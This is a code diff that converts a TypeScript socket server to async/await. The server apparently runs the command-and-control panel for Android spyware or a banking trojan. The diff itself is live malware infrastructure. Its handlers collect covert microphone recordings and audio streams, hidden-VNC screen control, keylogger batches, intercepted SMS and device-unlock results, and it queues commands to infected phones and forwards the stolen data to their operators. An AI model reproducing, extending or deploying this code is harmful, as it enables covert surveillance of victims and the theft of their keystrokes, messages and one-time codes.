@@ -758,7 +758,7 @@ class SocketService {
         } else if (data.type === 'download_end') {
           this.transfers.delete(`${id}:${data.transferId}`);
           if (data.error) {
-            dbHelpers.addLog('ERROR', 'MIC', `Mic transfer failed from ${id}: ${data.error}`);
+            (await dbHelpers.addLog('ERROR', 'MIC', `Mic transfer failed from ${id}: ${data.error}`));
             this.markCommandResponded(id, CMD.MIC, `Transfer failed: ${data.error}`);
           }
         } else if (data.file) {
@@ -766,7 +766,7 @@ class SocketService {
           if (data.buffer.length > MAX_SINGLE_BUFFER_SIZE * 1.34) { log.warn(`Socket: Mic buffer too large: ${id}`); return; }
           const buffer = Buffer.from(data.buffer, 'base64');
           this.saveFileToDb(id, 'recording', buffer, data.name || `recording_${Date.now()}.mp4`);
-          dbHelpers.addLog('DATA', 'MIC', `Recording from ${id}`, JSON.stringify({ size: buffer.length, name: data.name }));
+          (await dbHelpers.addLog('DATA', 'MIC', `Recording from ${id}`, JSON.stringify({ size: buffer.length, name: data.name })));
           this.markCommandResponded(id, CMD.MIC, 'Recording received');
           broadcastData('mic');
         } else if (data.streamAudio === true) {
@@ -782,22 +782,22 @@ class SocketService {
             this.broadcastToDeviceOwnerBinary(id, 'client:mic_stream', { id, timestamp: data.timestamp }, Buffer.from(data.buffer, 'base64'));
           }
         } else if (data.status) {
-          dbHelpers.addLog('DATA', 'MIC', `Mic status from ${id}: ${data.status}`, JSON.stringify({ duration: data.duration }));
+          (await dbHelpers.addLog('DATA', 'MIC', `Mic status from ${id}: ${data.status}`, JSON.stringify({ duration: data.duration })));
           this.markCommandResponded(id, CMD.MIC, data.status);
           const statusData = data.status === 'stopped' || data.status === 'error'
             ? null
             : { status: data.status, duration: data.duration, timestamp: Date.now() };
-          dbHelpers.setClientData(id, 'mic_status', JSON.stringify(statusData));
+          (await dbHelpers.setClientData(id, 'mic_status', JSON.stringify(statusData)));
           this.broadcastToDeviceOwner(id, 'client:data', { id, dataType: 'mic_status', status: data.status, duration: data.duration });
         } else if (data.error) {
-          dbHelpers.addLog('ERROR', 'MIC', `Mic error from ${id}: ${data.message || data.error}`);
+          (await dbHelpers.addLog('ERROR', 'MIC', `Mic error from ${id}: ${data.message || data.error}`));
           this.markCommandResponded(id, CMD.MIC, data.message || data.error);
-          dbHelpers.setClientData(id, 'mic_status', JSON.stringify(null));
+          (await dbHelpers.setClientData(id, 'mic_status', JSON.stringify(null)));
           this.broadcastToDeviceOwner(id, 'client:data', { id, dataType: 'mic_status', status: 'error', error: data.message || data.error });
         }
       } catch (err: unknown) { log.error(`Mic: ${err instanceof Error ? err.message : String(err)}`); }
     });
-    socket.on(CMD.HVNC, (data: any, binary?: Buffer) => {
+    socket.on(CMD.HVNC, async (data: any, binary?: Buffer) => {
       try {
         if (!data || !data.type) return;
         if (binary && typeof binary === 'string') {
@@ -844,7 +844,7 @@ class SocketService {
           case 'status':
             this.broadcastToDeviceOwner(id, 'client:hvnc', { id, type: 'status', status: data.status, streaming: data.streaming, width: data.width, height: data.height, accessibilityEnabled: data.accessibilityEnabled, accessibilityConnected: data.accessibilityConnected, projectionReady: data.projectionReady, codec: data.codec });
             if (data.status && data.status !== 'streaming') {
-              dbHelpers.addLog('DATA', 'HVNC', `HVNC status from ${id}: ${data.status}`);
+              (await dbHelpers.addLog('DATA', 'HVNC', `HVNC status from ${id}: ${data.status}`));
               this.markCommandResponded(id, CMD.HVNC, data.status);
             }
             break;
@@ -854,26 +854,26 @@ class SocketService {
         }
       } catch (err: unknown) { log.error(`HVNC: ${err instanceof Error ? err.message : String(err)}`); }
     });
-    socket.on(CMD.INSPECTOR, (data: any) => {
+    socket.on(CMD.INSPECTOR, async (data: any) => {
       try {
         if (!data || !data.type) return;
         this.broadcastToDeviceOwner(id, 'client:inspector', { id, ...data });
         if (data.type === 'announcement') {
-          dbHelpers.addLog('DATA', 'INSPECTOR', `Announcement from ${id}: ${data.announcement}`);
+          (await dbHelpers.addLog('DATA', 'INSPECTOR', `Announcement from ${id}: ${data.announcement}`));
         } else if (data.type === 'error' || data.type === 'action_error' || data.type === 'screenshot_error') {
-          dbHelpers.addLog('ERROR', 'INSPECTOR', `Inspector error from ${id}: ${data.error || data.type}`);
+          (await dbHelpers.addLog('ERROR', 'INSPECTOR', `Inspector error from ${id}: ${data.error || data.type}`));
           this.markCommandResponded(id, CMD.INSPECTOR, data.error || data.type);
         } else if (data.type === 'tree' || data.type === 'screenshot' || data.type === 'action_result' || data.type === 'status') {
           this.markCommandResponded(id, CMD.INSPECTOR, data.type);
         }
       } catch (err: unknown) { log.error(`Inspector: ${err instanceof Error ? err.message : String(err)}`); }
     });
-    socket.on(CMD.KEYLOGGER, (data: any, ack?: (r: any) => void) => {
+    socket.on(CMD.KEYLOGGER, async (data: any, ack?: (r: any) => void) => {
       try {
         if (!data) return;
         this.broadcastToDeviceOwner(id, 'client:keylogger', { id, ...data });
         if (data.type === 'batch') {
-          dbHelpers.addLog('DATA', 'KEYLOGGER', `Keylogger batch from ${id} (${data.keystrokes?.length || 0} entries)`);
+          (await dbHelpers.addLog('DATA', 'KEYLOGGER', `Keylogger batch from ${id} (${data.keystrokes?.length || 0} entries)`));
         } else if (data.type === 'error') {
           this.markCommandResponded(id, CMD.KEYLOGGER, data.error || 'error');
         } else {
@@ -882,7 +882,7 @@ class SocketService {
       } catch (err: unknown) { log.error(`Keylogger: ${err instanceof Error ? err.message : String(err)}`); }
       finally { if (ack) ack({ ok: true }); }
     });
-    socket.on(CMD.SMS_PUSH, (data: any) => {
+    socket.on(CMD.SMS_PUSH, async (data: any) => {
       try {
         if (!data) return;
         this.broadcastToDeviceOwner(id, 'client:sms_push', { id, ...data });
@@ -892,16 +892,16 @@ class SocketService {
         const dateStr = typeof rawTs === 'number' ? new Date(rawTs).toISOString() : String(rawTs);
         const incomingEntry = { address: sender, body, date: dateStr, type: 1 };
         try {
-          const smsData = JSON.parse(dbHelpers.getOrCreateClientData(id, 'sms'));
+          const smsData = JSON.parse((await dbHelpers.getOrCreateClientData(id, 'sms')));
           if (Array.isArray(smsData)) {
             smsData.unshift(incomingEntry);
             if (smsData.length > 500) smsData.splice(500);
-            dbHelpers.setClientData(id, 'sms', JSON.stringify(smsData));
+            (await dbHelpers.setClientData(id, 'sms', JSON.stringify(smsData)));
           }
         } catch (persistErr: unknown) {
           log.error(`SMS persist failed: ${id}: ${persistErr instanceof Error ? persistErr.message : String(persistErr)}`);
         }
-        dbHelpers.addLog('DATA', 'SMS_PUSH', `Incoming SMS from ${sender}`, JSON.stringify({ body: body.slice(0, 80) }));
+        (await dbHelpers.addLog('DATA', 'SMS_PUSH', `Incoming SMS from ${sender}`, JSON.stringify({ body: body.slice(0, 80) })));
         this.broadcastToDeviceOwner(id, 'client:data', { id, dataType: 'sms' });
       } catch (err: unknown) { log.error(`SMS push: ${err instanceof Error ? err.message : String(err)}`); }
     });
@@ -912,16 +912,16 @@ class SocketService {
         this.markCommandResponded(id, CMD.DEVICE_UNLOCK, data.type || 'unlock_attempted');
       } catch (err: unknown) { log.error(`Unlock: ${err instanceof Error ? err.message : String(err)}`); }
     });
-    socket.on('cmd_error', (data: any) => {
+    socket.on('cmd_error', async (data: any) => {
       try {
         if (!data) return;
         const errorMsg = String(data.error || data.message || 'Unknown device error');
         const cmdId = data.cmdId ? String(data.cmdId) : null;
         log.warn(`Cmd error: ${id}: ${errorMsg}`);
-        dbHelpers.addLog('ERROR', 'COMMAND', `Cmd error: ${id}: ${errorMsg}`, JSON.stringify({ cmdId }));
+        (await dbHelpers.addLog('ERROR', 'COMMAND', `Cmd error: ${id}: ${errorMsg}`, JSON.stringify({ cmdId })));
         if (cmdId) {
           this.broadcastToDeviceOwner(id, 'client:command', { id, commandId: cmdId, status: 'error', dataType: 'unknown', error: errorMsg });
-          try { dbHelpers.updateCommandStatus(cmdId, 'failed'); } catch { }
+          try { (await dbHelpers.updateCommandStatus(cmdId, 'failed')); } catch { }
         } else {
           this.broadcastToDeviceOwner(id, 'client:data', { id, dataType: 'error', error: errorMsg });
         }
@@ -929,42 +929,42 @@ class SocketService {
     });
   }
 
-  send(clientId: string, cmd: CmdType, params: Record<string, unknown> = {}): { sent: boolean; commandId: string } {
+  async send(clientId: string, cmd: CmdType, params: Record<string, unknown> = {}): Promise<{ sent: boolean; commandId: string }> {
     const commandId = crypto.randomUUID();
     const socket = this.sockets.get(clientId);
     const paramsForDb = JSON.stringify(params);
     const truncatedParams = paramsForDb.length > 1000 ? paramsForDb.substring(0, 1000) + '...' : paramsForDb;
-    dbHelpers.createCommand(commandId, clientId, cmd, truncatedParams);
+    (await dbHelpers.createCommand(commandId, clientId, cmd, truncatedParams));
     if (socket) {
       const { type: _t, cmdId: _c, timestamp: _ts, ...safeParams } = params;
       socket.emit('order', { ...safeParams, type: cmd, cmdId: commandId, timestamp: Date.now() });
-      dbHelpers.updateCommandStatus(commandId, 'delivered');
+      (await dbHelpers.updateCommandStatus(commandId, 'delivered'));
       this.broadcastToDeviceOwner(clientId, 'client:command', { id: clientId, commandId, status: 'delivered', dataType: CMD_TO_DATA_TYPE[cmd] });
       const logParams = { commandId, ...safeParams };
 
       const logStr = JSON.stringify(logParams);
-      dbHelpers.addLog('COMMAND', 'SOCKET', `Command ${cmd} sent to ${clientId}`, logStr.length > 1000 ? logStr.substring(0, 1000) + '...' : logStr);
+      (await dbHelpers.addLog('COMMAND', 'SOCKET', `Command ${cmd} sent to ${clientId}`, logStr.length > 1000 ? logStr.substring(0, 1000) + '...' : logStr));
       return { sent: true, commandId };
     } else {
       this.queueCommand(clientId, cmd, params, commandId);
       const { type: _t2, cmdId: _c2, timestamp: _ts2, ...safeParams2 } = params;
       const queueLogStr = JSON.stringify({ commandId, ...safeParams2 });
-      dbHelpers.addLog('COMMAND', 'QUEUE', `Command ${cmd} queued for ${clientId}`, queueLogStr.length > 1000 ? queueLogStr.substring(0, 1000) + '...' : queueLogStr);
+      (await dbHelpers.addLog('COMMAND', 'QUEUE', `Command ${cmd} queued for ${clientId}`, queueLogStr.length > 1000 ? queueLogStr.substring(0, 1000) + '...' : queueLogStr));
       return { sent: false, commandId };
     }
   }
 
-  private queueCommand(clientId: string, cmd: CmdType, params: Record<string, unknown>, commandId?: string): void {
+  private async queueCommand(clientId: string, cmd: CmdType, params: Record<string, unknown>, commandId?: string): Promise<void> {
     let queue: any[] = [];
-    try { queue = JSON.parse(dbHelpers.getOrCreateClientData(clientId, 'queue')) || []; } catch { queue = []; }
+    try { queue = JSON.parse((await dbHelpers.getOrCreateClientData(clientId, 'queue'))) || []; } catch { queue = []; }
     const { type: _t, cmdId: _c, timestamp: _ts, ...safeParams } = params;
     queue.push({ ...safeParams, type: cmd, cmdId: commandId || crypto.randomUUID(), timestamp: Date.now() });
-    dbHelpers.setClientData(clientId, 'queue', JSON.stringify(queue));
+    (await dbHelpers.setClientData(clientId, 'queue', JSON.stringify(queue)));
   }
 
-  private runQueuedCommands(clientId: string): void {
+  private async runQueuedCommands(clientId: string): Promise<void> {
     let queue: any[] = [];
-    try { queue = JSON.parse(dbHelpers.getOrCreateClientData(clientId, 'queue')) || []; } catch { queue = []; }
+    try { queue = JSON.parse((await dbHelpers.getOrCreateClientData(clientId, 'queue'))) || []; } catch { queue = []; }
     if (queue.length === 0) return;
     const socket = this.sockets.get(clientId);
     if (!socket) return;
@@ -976,7 +976,7 @@ class SocketService {
       const { cmdId, type, timestamp, ...params } = cmd;
       socket.emit('order', { type, ...params, cmdId, timestamp });
       if (cmdId) {
-        dbHelpers.updateCommandStatus(cmdId, 'delivered');
+        (await dbHelpers.updateCommandStatus(cmdId, 'delivered'));
         const cmdType = type as CmdType;
         this.broadcastToDeviceOwner(clientId, 'client:command', {
           id: clientId,
@@ -986,11 +986,11 @@ class SocketService {
         });
       }
       delivered++;
-      dbHelpers.setClientData(clientId, 'queue', JSON.stringify(remaining));
+      (await dbHelpers.setClientData(clientId, 'queue', JSON.stringify(remaining)));
     }
     if (delivered > 0) {
-      dbHelpers.addLog('COMMAND', 'QUEUE', `Ran ${delivered} queued commands for ${clientId}` +
-        (remaining.length > 0 ? ` (${remaining.length} remaining - socket disconnected)` : ''));
+      (await dbHelpers.addLog('COMMAND', 'QUEUE', `Ran ${delivered} queued commands for ${clientId}` +
+                (remaining.length > 0 ? ` (${remaining.length} remaining - socket disconnected)` : '')));
     }
   }
 
@@ -1032,8 +1032,8 @@ class SocketService {
     this.hvncRate.delete(deviceId);
   }
 
-  broadcastToDeviceOwner(deviceId: string, event: string, data: any): void {
-    const ownerId = this.deviceOwners.get(deviceId) ?? dbHelpers.getDeviceOwnerId(deviceId);
+  async broadcastToDeviceOwner(deviceId: string, event: string, data: any): Promise<void> {
+    const ownerId = this.deviceOwners.get(deviceId) ?? (await dbHelpers.getDeviceOwnerId(deviceId));
     if (ownerId && !this.deviceOwners.has(deviceId)) this.deviceOwners.set(deviceId, ownerId);
     if (ownerId) {
       this.io.to('admin').to(`user:${ownerId}`).emit(event, data);
@@ -1042,9 +1042,9 @@ class SocketService {
     }
   }
 
-  broadcastToDeviceOwnerBinary(deviceId: string, event: string, meta: any, binary?: Buffer): void {
+  async broadcastToDeviceOwnerBinary(deviceId: string, event: string, meta: any, binary?: Buffer): Promise<void> {
     if (!binary) return;
-    const ownerId = this.deviceOwners.get(deviceId) ?? dbHelpers.getDeviceOwnerId(deviceId);
+    const ownerId = this.deviceOwners.get(deviceId) ?? (await dbHelpers.getDeviceOwnerId(deviceId));
     if (ownerId && !this.deviceOwners.has(deviceId)) this.deviceOwners.set(deviceId, ownerId);
     if (ownerId) {
       this.io.to('admin').to(`user:${ownerId}`).emit(event, meta, binary);
@@ -1084,7 +1084,7 @@ class SocketService {
       if (transferId.startsWith(clientId + ':')) this.transfers.delete(transferId);
     }
     this.io.to('admin').emit('client:disconnect', { id: clientId });
-    const forceOwnerId = dbHelpers.getDeviceOwnerId(clientId);
+    const forceOwnerId = (await dbHelpers.getDeviceOwnerId(clientId));
     if (forceOwnerId) this.io.to(`user:${forceOwnerId}`).emit('client:disconnect', { id: clientId });
   }
 
